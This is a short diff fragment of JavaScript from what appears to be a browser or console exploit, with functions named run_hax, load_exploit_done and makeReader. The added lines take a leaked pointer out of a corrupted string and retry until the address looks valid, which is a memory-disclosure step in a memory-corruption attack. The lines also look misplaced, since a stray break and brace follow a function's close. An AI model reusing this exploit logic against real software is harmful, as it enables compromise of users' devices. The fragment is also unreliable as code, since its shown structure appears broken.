@@ -678,6 +678,10 @@ function run_hax() {
     load_exploit_done(); 
     }
 }
+var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
+if (leak < 0x1000000000000)
+break;
+}
 function makeReader(read_addr, ffs_name) {
 var fake_s = '';
 fake_s += '0000';
